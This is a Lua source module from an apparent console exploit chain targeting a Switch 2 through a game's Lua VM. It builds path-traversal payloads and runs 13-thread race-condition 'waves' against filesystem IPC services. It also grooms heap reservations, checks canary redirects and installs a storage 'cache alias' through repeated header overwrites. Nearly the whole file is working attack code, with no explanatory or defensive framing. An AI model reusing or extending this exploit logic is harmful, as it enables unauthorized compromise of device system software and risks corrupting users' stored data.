-- s2_wave.lua — Payload Configuration, Wave Analysis, Campaign Loop & Alias Installer
-- Target: Switch 2 (Ounce) — Seedsow Lullaby (Artemis Lua 5.1 VM)
-- Split from s2_race.lua to stay under the 32,768-byte http.lua PUT /save upload cap.

local P  = require("s2_prim")
local FS = require("s2_fs")

local math_min   = math.min
local math_abs   = math.abs
local str_byte   = string.byte
local str_sub    = string.sub
local str_format = string.format

local W = {}

function W.attach(M)
    -- ---------------------------------------------------------------------------
    -- 4. Payload & Profile Configuration + Wave Result Analysis
    -- ---------------------------------------------------------------------------
    function M.configure_profile(rt, setup, config, profile)
        local extent_total = setup.extentTotal
        local positive     = (profile == "positive")
        local fill_byte    = positive and 0x42 or 0x2F
        local payload      = {}
        for i = 1, extent_total do payload[i] = fill_byte end
        payload[extent_total] = 0

        local function write_into(text, off0)
            for i = 1, #text do
                payload[off0 + i] = str_byte(text, i)
            end
        end

        if positive then
            local m_off = config.MARKER_OFFSET
            local fs_step = config.POSITIVE_FILL_SEGMENT
            local pos = fs_step
            while pos < m_off do
                payload[pos + 1] = 0x2F
                pos = pos + fs_step + 1
            end
            write_into(setup.selectedDir, m_off)
            for i = m_off + #setup.selectedDir, config.EXTENT_SIZE - 1 do
                payload[i + 1] = 0x2F
            end
            write_into("/..\\", 0)
        elseif profile == "extent-absent" or profile == "extent-present" then
            write_into(setup.SCRATCH_DIR .. "/", 0)
            for i = 1, #setup.segments do
                write_into("/" .. setup.segments[i] .. "/", i * config.SLOT_SIZE)
            end
            local bname = (profile == "extent-absent") and "SPAN_ABSENT" or "SPAN_MARKER"
            write_into(bname, config.EXTENT_SIZE - #bname)
        else
            write_into("/../", 0)
        end

        local payload_str = P.bytes_to_str(payload)
        local slot_sz = config.SLOT_SIZE
        local p0 = str_sub(payload_str, 1, slot_sz)
        rt.wr(setup.triggerBuf, p0)

        local piece_idx = 1
        local at = slot_sz
        while at < #payload_str do
            local chunk = str_sub(payload_str, at + 1, math_min(at + slot_sz, #payload_str))
            local fbuf = setup.fragmentBufs[piece_idx]
            rt.wr(fbuf, chunk)
            local pkt = P.apply_context(P.packet(1002, "", {
                x = {{addr = fbuf, size = #chunk}}
            }), 3)
            setup.reqStrs[2 + piece_idx] = pkt
            rt.wr(setup.REQ[2 + piece_idx], pkt)
            piece_idx = piece_idx + 1
            at = at + slot_sz
        end
        return true
    end

    function M.configure_payload(rt, setup, config, tail_bytes)
        local m_off = config.MARKER_OFFSET
        local payload_str = "/..\\" .. string.rep("B", m_off - 4) .. P.bytes_to_str(tail_bytes) .. "\0"
        local slot_sz = config.SLOT_SIZE
        rt.wr(setup.triggerBuf, str_sub(payload_str, 1, slot_sz))

        local piece_idx = 1
        local at = slot_sz
        while at < #payload_str do
            local chunk = str_sub(payload_str, at + 1, math_min(at + slot_sz, #payload_str))
            local fbuf = setup.fragmentBufs[piece_idx]
            rt.wr(fbuf, chunk)
            local pkt = P.apply_context(P.packet(1002, "", {
                x = {{addr = fbuf, size = #chunk}}
            }), 3)
            setup.reqStrs[2 + piece_idx] = pkt
            rt.wr(setup.REQ[2 + piece_idx], pkt)
            piece_idx = piece_idx + 1
            at = at + slot_sz
        end
        return true
    end

    function M.analyze_wave(rt, fs, setup, config, profile, wave, group, create_pin_this_wave, state)
        local workers = setup.waveData.workers
        local gates   = setup.gates
        local REQ     = setup.REQ

        -- 1. Collect spans
        local spans = {}
        local span_by_name = {}
        for i = 1, 13 do
            local w = workers[i]
            local t_pre  = M.read_logical_result(rt, w, w.send_li - 1)
            local t_post = M.read_logical_result(rt, w, w.send_li + 1)
            if t_pre and t_post then
                local s = {name = config.roleLabels[i], start = t_pre, ["end"] = t_post}
                spans[#spans + 1] = s
                span_by_name[s.name] = s
            end
        end
        local trig_span = span_by_name["trigger"]

        -- 2. Qualify overlap
        local shape_missing = {}
        local through_set = {}
        for _, r in ipairs(config.throughRoles) do through_set[r] = true end
        if trig_span then
            for _, rname in ipairs(config.overlapRoles) do
                local sp = span_by_name[rname]
                local ok = false
                if sp and sp.start < trig_span.start then
                    if through_set[rname] then
                        ok = (trig_span["end"] < sp["end"])
                    else
                        ok = (trig_span.start < sp["end"])
                    end
                end
                if not ok then shape_missing[#shape_missing + 1] = rname end
            end
        else
            for _, rname in ipairs(config.overlapRoles) do shape_missing[#shape_missing + 1] = rname end
        end
        local shape_count = #config.overlapRoles - #shape_missing
        local hole_span   = span_by_name["bottleneck"]
        local guard1_span = span_by_name["guard1"]
        local margin_us   = (hole_span and guard1_span) and rt.ticks_to_us(hole_span["end"] - guard1_span.start) or nil

        -- 3. Guard flags
        local scv = rt.rd_u32(gates.sampledCompleted)
        local sev = rt.rd_u32(gates.sampledEarlyHole)
        local ssv = rt.rd_u32(gates.spacingDecision)
        local trigger_aborted = (scv ~= 0 or sev ~= 0 or ssv ~= 0)

        local protected_ids = {0, 2, 3, 4, 5, 6, 7, 8, 10, 11}
        local protected_done = 0
        for _, rid in ipairs(protected_ids) do
            if rt.rd_u8(gates.roleDoneFlags + rid) ~= 0 then
                protected_done = protected_done + 1
            end
        end

        -- 4. Pin, clear, pre-release replies on W9 (workers[10])
        local w9 = workers[10]
        local pin_send_rc   = M.read_logical_result(rt, w9, setup.waveData.pinLogicalIdx)
        local clear_send_rc = M.read_logical_result(rt, w9, setup.waveData.clearLogicalIdx)
        local pre_send_rc   = M.read_logical_result(rt, w9, setup.waveData.preLogicalIdx)

        local pin_reply = (pin_send_rc == 0)
            and P.parse_response(rt.rd(setup.pinPkt, 256))
            or {result = 0xFFFFFFFF, moves = {}, copies = {}}
        local pin_shape_ok = (pin_reply.result == 0) and
            (not create_pin_this_wave or (#pin_reply.copies == 0 and #pin_reply.moves == 1))
        if create_pin_this_wave and pin_shape_ok then
            state.pinHandle = pin_reply.moves[1]
            setup.handles.pinHandle = state.pinHandle
        elseif create_pin_this_wave and not pin_shape_ok then
            for _, h in ipairs(pin_reply.moves) do rt.close_handle(h) end
            for _, h in ipairs(pin_reply.copies) do rt.close_handle(h) end
        end

        local clear_reply = (clear_send_rc == 0)
            and P.parse_response(rt.rd(setup.clearPkt, 256))
            or {result = 0xFFFFFFFF}
        local pre_reply = (pre_send_rc == 0)
            and P.parse_response(rt.rd(setup.prePkt, 256))
            or {result = 0xFFFFFFFF}

        local pre_stats5 = nil
        if pre_reply.result == 0 and #pre_reply.data >= 48 then
            pre_stats5 = P.u64(pre_reply.data, 5 * 8)
        end
        local after_stats = fs.read_allocation_counters(setup.handles.rootSession, setup.pktBuf)
        local pre_release_used = (group.held and pre_stats5) and (group.held[6] - pre_stats5) or nil

        local pin_persistent_bytes = (create_pin_this_wave and after_stats and group.before)
            and (group.before[6] - after_stats[6]) or 0
        if create_pin_this_wave and not config.PINNING_ALLOCATION_BYTES then
            if pin_persistent_bytes >= 0x400 and pin_persistent_bytes <= 0x40000 then
                config.PINNING_ALLOCATION_BYTES = pin_persistent_bytes
            end
        end
        local expected_pin_bytes = config.PINNING_ALLOCATION_BYTES or 7440
        local pin_cost_ok = (not create_pin_this_wave) or (pin_persistent_bytes == expected_pin_bytes)
        local restored = false
        if after_stats and group.before then
            local diff = math_abs(after_stats[6] + (create_pin_this_wave and expected_pin_bytes or 0) - group.before[6])
            restored = (diff <= config.HEAP_JITTER_BYTES)
        end

        -- 5. Role send codes & CMIF results
        local send_codes = {}
        local transport_ok = 0
        for i = 1, 13 do
            local sc = M.read_logical_result(rt, workers[i], workers[i].send_li)
            send_codes[i] = sc
            if sc == 0 then transport_ok = transport_ok + 1 end
        end

        local function result_at(idx1)
            if send_codes[idx1] ~= 0 then return 0xFFFFFFFF, nil end
            local rep = P.parse_response(rt.rd(REQ[idx1], 256))
            return rep.result, rep
        end

        local commit_res = result_at(1)
        local read_res   = result_at(2)
        local tail_ok    = true
        for i = 3, 6 do
            local tr = result_at(i)
            if tr == 0xFFFFFFFF or (tr % 0x400000) ~= 0x00320002 then tail_ok = false end
        end
        local canary_res, canary_rep = result_at(7)
        local canary_type = (canary_res == 0 and canary_rep and #canary_rep.data >= 4)
            and P.u32(canary_rep.data, 0) or -1
        local filler0_res = result_at(8)
        local filler1_res = result_at(9)
        local guard0_res  = result_at(11)
        local guard1_res  = result_at(12)
        local trigger_res, trigger_rep = result_at(13)
        local trigger_type = (trigger_res == 0 and trigger_rep and #trigger_rep.data >= 4)
            and P.u32(trigger_rep.data, 0) or -1

        local health = fs.ipc_get_entry_type(setup.handles.savedHandle, setup.canaryPath)
        local post_healthy = (health.transport == 0 and health.result == 0 and health.type == 1)

        -- Pin window check
        local canary_start = M.read_logical_result(rt, workers[7], workers[7].send_li - 1)
        local canary_end   = M.read_logical_result(rt, workers[7], workers[7].send_li + 1)
        local pin_start    = M.read_logical_result(rt, w9, setup.waveData.pinLogicalIdx - 1)
        local pin_end      = M.read_logical_result(rt, w9, setup.waveData.pinLogicalIdx + 1)
        local pin_window_ok = true
        if create_pin_this_wave then
            pin_window_ok = (canary_start ~= nil and canary_end ~= nil and pin_start ~= nil and pin_end ~= nil and
                             canary_start < pin_start and pin_end < canary_end)
            state.pinFirstWaveQualified = (pin_shape_ok and pin_window_ok and pin_cost_ok and restored)
        end

        local changed_paths = {}
        if canary_res ~= 0 or canary_type ~= 1 then changed_paths[#changed_paths + 1] = "canary" end
        if (filler0_res % 0x400000) ~= 0x202 then changed_paths[#changed_paths + 1] = "filler0" end
        if (filler1_res % 0x400000) ~= 0x202 then changed_paths[#changed_paths + 1] = "filler1" end
        if (guard0_res % 0x400000) ~= 0x202 then changed_paths[#changed_paths + 1] = "guard0" end
        if (guard1_res % 0x400000) ~= 0x202 then changed_paths[#changed_paths + 1] = "guard1" end

        local is_pos_profile = (profile == "positive" or str_sub(profile, 1, 5) == "cache")
        local function filler_ok(r)
            local c = r % 0x400000
            return c == 0x202 or (is_pos_profile and c == 0x2EEA02)
        end
        local paths_expected = filler_ok(filler0_res) and filler_ok(filler1_res) and
                               ((guard0_res % 0x400000) == 0x202) and ((guard1_res % 0x400000) == 0x202)

        local release_sent = (send_codes[10] == 0)
        local window_ok = (group.reserved == 59 and #group.failures == 0 and group.outer ~= 0 and
                           wave.done == 13 and transport_ok == 13 and wave.joined == 13 and
                           protected_done == 10 and release_sent and wave.signalResult == 0 and
                           trig_span ~= nil and shape_count == 10 and
                           margin_us ~= nil and margin_us >= 300 and
                           not trigger_aborted and tail_ok and commit_res == 0 and read_res == 0 and
                           paths_expected and pin_shape_ok and clear_reply.result == 0 and
                           pre_reply.result == 0 and restored and pin_cost_ok and
                           (not create_pin_this_wave or pin_window_ok) and state.pinFirstWaveQualified and
                           pre_release_used ~= nil and pre_release_used >= config.WINDOW_MINIMUM_CACHE_HELD)

        local selected_marker = (trigger_res == 0 and trigger_type == 1)
        local observed_redirect = (canary_res == 0 and canary_type == 0 and #changed_paths == 1 and changed_paths[1] == "canary")
        local trigger_canonical = trigger_res % 0x400000

        -- Extract role timings relative to trigger start for auto-retuning
        local role_timings = {}
        if trig_span then
            for _, sp in ipairs(spans) do
                role_timings[sp.name] = {
                    relStartUs = rt.ticks_to_us(sp.start - trig_span.start),
                    relEndUs   = rt.ticks_to_us(sp["end"] - trig_span.start),
                    durationUs = rt.ticks_to_us(sp["end"] - sp.start)
                }
            end
        end

        local rejections = {}
        if shape_count ~= 10 then rejections[#rejections + 1] = "shape-10" end
        if not margin_us or margin_us < 300 then rejections[#rejections + 1] = "margin>=300" end
        if trigger_aborted then rejections[#rejections + 1] = "no-abort" end
        if not pre_release_used or pre_release_used < config.WINDOW_MINIMUM_CACHE_HELD then
            rejections[#rejections + 1] = "pre-release"
        end

        return {
            window                 = window_ok,
            shape                  = shape_count,
            shapeMissing           = shape_missing,
            marginUs               = margin_us,
            rejections             = rejections,
            roleTimings            = role_timings,
            preReleaseUsed         = pre_release_used,
            canaryResult           = canary_res,
            canaryType             = canary_type,
            triggerResult          = trigger_res,
            triggerCanonical       = trigger_canonical,
            triggerAborted         = trigger_aborted,
            changedPaths           = changed_paths,
            releaseWasSent         = release_sent,
            postHealthy            = post_healthy,
            canaryRedirect         = (profile == "positive" and window_ok and observed_redirect and post_healthy),
            extentQualified        = (profile == "extent-present" and window_ok and selected_marker and canary_res == 0 and canary_type == 1 and post_healthy),
            negativeControl        = (profile == "negative" and window_ok and not trigger_aborted and trigger_canonical == 0x2EEC02 and canary_res == 0 and canary_type == 1 and post_healthy),
            abortControl           = (trigger_aborted and scv == 1 and trigger_canonical == setup.abortControlCanonical and canary_res == 0 and canary_type == 1 and post_healthy),
            abortHoleControl       = (trigger_aborted and sev == 1 and ssv == 1 and trigger_canonical == setup.abortControlCanonical and canary_res == 0 and canary_type == 1 and post_healthy),
        }
    end

    -- ---------------------------------------------------------------------------
    -- 5. Control & Positive Canary Wave Loop + 7-Step Cache Alias Installation
    -- ---------------------------------------------------------------------------
    function M.run_control_wave_loop(rt, fs, setup, config, log_fn, should_stop)
        local function log(msg) if log_fn then log_fn(msg) end end

        local dirty_write_buf = rt.alloc_page(config.DIRTY_FILE_SIZE + 0x2000)
        rt.memset(dirty_write_buf, 0x66, config.DIRTY_FILE_SIZE)
        local dirty_write_pkt = rt.alloc_page(0x2000)

        local state = {
            pinHandle             = setup.handles.pinHandle or 0,
            pinFirstWaveQualified = false,
            canaryQualified       = false,
            workerStateSafe       = true,
            wavesStarted          = 0,
            wavesJoined           = 0,
            waveRecords           = {},
            positiveRecords       = {},
            positiveWindows       = 0,
        }
        local next_profile = "abort-control"

        for attempt = 1, config.MAX_CONTROL_WAVES do
            if should_stop and should_stop() then break end
            if state.canaryQualified then break end
            local profile = next_profile

            if not fs.write_dirty_data(setup.handles.savedHandle, setup.dirtyFilePath,
                    config.DIRTY_FILE_SIZE, dirty_write_buf, dirty_write_pkt) then
                log(str_format("FAIL: W%02d dirty write", attempt))
                break
            end

            M.reset_wave_state(rt, setup)
            if profile == "abort-control" then rt.wr_u32(setup.gates.completedFlag, 1) end
            if profile == "abort-hole-control" then rt.wr_u32(setup.gates.bottleneckFinished, 1) end
            M.configure_profile(rt, setup, config, profile)

            local group = fs.open_reservation_group(setup.handles.rootSession, setup.pktBuf, 59)
            if not group.ok then
                log(str_format("FAIL: W%02d reservation (%s)", attempt, tostring(group.error)))
                break
            end

            rt.wr(setup.REQ[10], P.domain_close_object(group.outer))
            rt.wr_u32(setup.gates.groupSessionSlot, group.session)
            local is_extent = (profile == "extent-absent" or profile == "extent-present")
            rt.wr_u32(setup.gates.triggerHandleSlot, is_extent and setup.handles.extentTriggerHandle or setup.handles.triggerHandle)

            local create_pin = (state.pinHandle == 0)
            rt.wr(setup.pinPkt, create_pin and setup.pinStr200 or setup.pinStr1009)

            local wave = M.execute_wave(rt, setup)
            if wave.created < 13 or wave.joined < 13 then
                fs.close_reservation_group(group, true, setup.pktBuf)
                state.workerStateSafe = wave.workerStateSafe
                log(str_format("FAIL: W%02d workers=%d/13 joined=%d/13", attempt, wave.created, wave.joined))
                break
            end
            state.wavesStarted = state.wavesStarted + 1
            state.wavesJoined  = state.wavesJoined + 1

            local wres = M.analyze_wave(rt, fs, setup, config, profile, wave, group, create_pin, state)
            fs.close_reservation_group(group, not wres.releaseWasSent, setup.pktBuf)

            local rec = {
                wave = attempt, profile = profile, window = wres.window, shape = wres.shape,
                shapeMissing = wres.shapeMissing, marginUs = wres.marginUs,
                rejections = wres.rejections, roleTimings = wres.roleTimings,
            }
            state.waveRecords[#state.waveRecords + 1] = rec
            if profile == "positive" then
                state.positiveRecords[#state.positiveRecords + 1] = rec
                if wres.window then state.positiveWindows = state.positiveWindows + 1 end
            end

            log(str_format("Wave %02d [%s] win=%s shape=%d/10 margin=%s can=%d",
                attempt, profile, tostring(wres.window), wres.shape,
                wres.marginUs and str_format("%.0fus", wres.marginUs) or "NA", wres.canaryType))

            if profile == "abort-control" then
                if state.pinFirstWaveQualified and wres.abortControl then
                    next_profile = "abort-hole-control"
                else
                    if state.pinHandle ~= 0 then
                        rt.close_handle(state.pinHandle)
                        state.pinHandle, setup.handles.pinHandle = 0, 0
                    end
                    next_profile = "abort-control"
                end
            elseif profile == "abort-hole-control" then
                if wres.abortHoleControl then next_profile = "extent-absent" end
            elseif profile == "extent-absent" then
                next_profile = "extent-present"
            elseif profile == "extent-present" then
                if wres.extentQualified then next_profile = "negative" end
            elseif profile == "negative" then
                if wres.negativeControl then next_profile = "positive" end
            elseif profile == "positive" then
                if wres.canaryRedirect then state.canaryQualified = true
                elseif not wres.triggerAborted and wres.shape < 10 then
                    state.workerStateSafe = false; break
                end
            end
        end

        if not state.canaryQualified then
            FS.retune_wave_schedule(state, config, log)
        end

        state.dirtyWriteBuf = dirty_write_buf
        state.dirtyWritePkt = dirty_write_pkt
        return state
    end

    function M.prepare_and_install_alias(rt, fs, setup, config, campaign_state, log_fn, should_stop)
        local function log(msg) if log_fn then log_fn(msg) end end
        if not campaign_state.canaryQualified or not campaign_state.workerStateSafe then
            return {ok = false, aliasInstalled = false, failureReason = "canary-not-qualified"}
        end

        local control_buf = rt.alloc_page(config.CONTROL_SIZE + 0x1000)
        rt.memset(control_buf, 0xA5, config.CONTROL_SIZE)
        local c_read = fs.ipc_storage_read(setup.handles.storageHandle, 0, config.CONTROL_SIZE, control_buf)
        if c_read.error ~= 0 then
            return {ok = false, aliasInstalled = false, failureReason = "control-read-failed"}
        end
        local control_hex = P.hex(rt.rd(control_buf, 16))

        -- Reserve the 59-object group BEFORE opening candidate_handle so candidate_handle
        -- reuses the exact 0x5A0 canary slot above the reservation gap (probe-reserved-gap-seedsow.cjs:1144-1155)
        local init_group = fs.open_reservation_group(setup.handles.rootSession, setup.pktBuf, 59)
        if not init_group.ok then
            return {ok = false, aliasInstalled = false, failureReason = "candidate-reserve-group-failed"}
        end

        local before_cand = fs.read_allocation_counters(setup.handles.rootSession, setup.pktBuf)
        local candidate_handle = fs.open_content_storage(setup.handles.rootSession)
        if candidate_handle == 0 then
            fs.close_reservation_group(init_group, true, setup.pktBuf)
            return {ok = false, aliasInstalled = false, failureReason = "candidate-open-failed"}
        end
        setup.handles.candidateHandle = candidate_handle

        local prime_buf = rt.alloc_page(0x1000)
        rt.memset(prime_buf, 0xA5, 16)
        local p_read = fs.ipc_storage_read(candidate_handle, 0, 16, prime_buf)
        local prime_hex = (p_read.error == 0) and P.hex(rt.rd(prime_buf, 16)) or ""
        local after_cand = fs.read_allocation_counters(setup.handles.rootSession, setup.pktBuf)
        local alloc_cost = (before_cand and after_cand) and (before_cand[6] - after_cand[6]) or (config.PINNING_ALLOCATION_BYTES or 7440)
        if init_group.before and init_group.held then
            init_group.before[6] = init_group.before[6] - alloc_cost
            init_group.held[6]   = init_group.held[6] - alloc_cost
        end

        if prime_hex ~= control_hex then
            fs.close_reservation_group(init_group, true, setup.pktBuf)
            return {
                ok = false,
                aliasInstalled = false,
                candidateHandle = candidate_handle,
                primeHex = prime_hex,
                aliasControlHex = "",
                failureReason = "candidate-prime-mismatch"
            }
        end
        log(str_format("BASELINE: OK candidate=0x%x alloc=%dB", candidate_handle, alloc_cost))

        -- Safe only when all 7 nul_writes steps succeeded (dirty == 0 at +0x11)
        local function restore_clean_alias()
            if fs.ipc_storage_invalidate(candidate_handle, 0, config.STORAGE_SIZE or 0x40000000) ~= 0 then
                return false
            end
            rt.memset(prime_buf, 0xA5, 16)
            local rr = fs.ipc_storage_read(candidate_handle, 0, 16, prime_buf)
            return rr.error == 0 and P.hex(rt.rd(prime_buf, 16)) == prime_hex
        end

        local alias_buf       = rt.alloc_page(0x1000)
        local alias_installed = false
        local needs_retire    = false
        local total_waves     = 0
        local alias_ctrl_hex  = ""
        campaign_state.pendingGroup = init_group

        local buckets = config.ALIAS_BUCKETS or {config.ALIAS_OFFSET}
        local tried = 0
        for _, off in ipairs(buckets) do
            if should_stop and should_stop() then break end
            if (off + config.CACHE_READ_SIZE) <= (config.STORAGE_SIZE or 0x40000000) then
                rt.memset(alias_buf, 0xA5, 16)
                local a_read = fs.ipc_storage_read(setup.handles.storageHandle, off, 16, alias_buf)
                local a_hex = (a_read.error == 0) and P.hex(rt.rd(alias_buf, 16)) or ""
                if a_hex ~= "" and a_hex ~= control_hex then
                    tried = tried + 1
                    M.set_alias_offset(config, off)
                    alias_ctrl_hex = a_hex
                    needs_retire = true
                    local copy_res = M.install_address_header(rt, fs, setup, config, campaign_state,
                        config.CACHE_ALIAS_PREFIX, "cache-alias", log_fn, should_stop)
                    total_waves = total_waves + (copy_res.wavesTotal or 0)
                    if not copy_res.ok or not campaign_state.workerStateSafe then
                        -- Partial header overwrite: do NOT call OperateRange(Invalidate); let cleanup retire via waves
                        break
                    end
                    rt.memset(alias_buf, 0xA5, 16)
                    local v_read = fs.ipc_storage_read(candidate_handle, off, 16, alias_buf)
                    local obs_hex = (v_read.error == 0) and P.hex(rt.rd(alias_buf, 16)) or ""
                    if obs_hex == prime_hex then
                        alias_installed = true
                        break
                    end
                    if tried >= 3 or not restore_clean_alias() then
                        break
                    end
                    needs_retire = false
                    log(str_format("ALIAS: bucket 0x%x missed, rotating...", off))
                end
            end
        end

        if campaign_state.pendingGroup then
            fs.close_reservation_group(campaign_state.pendingGroup, true, setup.pktBuf)
            campaign_state.pendingGroup = nil
        end

        log(str_format("ALIAS: %s offset=0x%x (%d waves)",
            alias_installed and "OK" or "FAIL", config.ALIAS_OFFSET, total_waves))
        return {
            ok                              = true,
            aliasInstalled                  = alias_installed,
            candidateHandle                 = candidate_handle,
            primeHex                        = prime_hex,
            aliasControlHex                 = alias_ctrl_hex,
            candidateCacheNeedsRetirement   = needs_retire,
            workerStateSafe                 = campaign_state.workerStateSafe,
            copyWavesTotal                  = total_waves,
        }
    end

    -- Shared NUL-terminated header installer used by alias, bucket-period, metadata pages, and retirement
    function M.install_address_header(rt, fs, setup, config, campaign_state, desired_bytes, stage_name, log_fn, should_stop)
        local function log(msg) if log_fn then log_fn(msg) end end
        local padded = {}
        for i = 1, #desired_bytes do padded[i] = desired_bytes[i] end
        if #padded == 0 or padded[#padded] ~= 0 then
            padded[#padded + 1] = 0
        end

        local ok_plan, steps = pcall(FS.nul_writes, padded)
        if not ok_plan or not steps or #steps == 0 then
            return {ok = false, wavesTotal = 0}
        end

        local waves_total = 0
        for step_idx = 1, #steps do
            if should_stop and should_stop() then return {ok = false, wavesTotal = waves_total} end
            local step = steps[step_idx]
            local confirmed = false
            local step_attempts = 0

            for _ = 1, config.COPY_BATCHES do
                if confirmed then break end
                for _ = 1, config.MAX_COPY_ATTEMPTS do
                    if should_stop and should_stop() then break end
                    step_attempts = step_attempts + 1
                    waves_total   = waves_total + 1

                    if not fs.write_dirty_data(setup.handles.savedHandle, setup.dirtyFilePath,
                            config.DIRTY_FILE_SIZE, campaign_state.dirtyWriteBuf, campaign_state.dirtyWritePkt) then
                        return {ok = false, wavesTotal = waves_total}
                    end

                    M.reset_wave_state(rt, setup)
                    M.configure_payload(rt, setup, config, step.bytes)

                    local group = campaign_state.pendingGroup
                    if group then campaign_state.pendingGroup = nil
                    else group = fs.open_reservation_group(setup.handles.rootSession, setup.pktBuf, 59) end
                    if not group.ok then return {ok = false, wavesTotal = waves_total} end

                    rt.wr(setup.REQ[10], P.domain_close_object(group.outer))
                    rt.wr_u32(setup.gates.groupSessionSlot, group.session)
                    rt.wr_u32(setup.gates.triggerHandleSlot, setup.handles.triggerHandle)
                    rt.wr(setup.pinPkt, setup.pinStr1009)

                    local wave = M.execute_wave(rt, setup)
                    if wave.created < 13 or wave.joined < 13 then
                        fs.close_reservation_group(group, true, setup.pktBuf)
                        campaign_state.workerStateSafe = wave.workerStateSafe
                        return {ok = false, wavesTotal = waves_total}
                    end

                    local wres = M.analyze_wave(rt, fs, setup, config, stage_name, wave, group, false, campaign_state)
                    fs.close_reservation_group(group, not wres.releaseWasSent, setup.pktBuf)
                    if not wres.triggerAborted and wres.shape < 10 then
                        campaign_state.workerStateSafe = false
                        return {ok = false, wavesTotal = waves_total}
                    end

                    if wres.window and wres.preReleaseUsed and
                       wres.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD and
                       #wres.changedPaths == 0 then
                        confirmed = true
                        break
                    end
                end
            end

            if not confirmed then
                log(str_format("  %s step %d/%d FAIL (%d waves)", stage_name, step_idx, #steps, step_attempts))
                return {ok = false, wavesTotal = waves_total}
            end
        end

        return {ok = true, wavesTotal = waves_total}
    end
end

return W
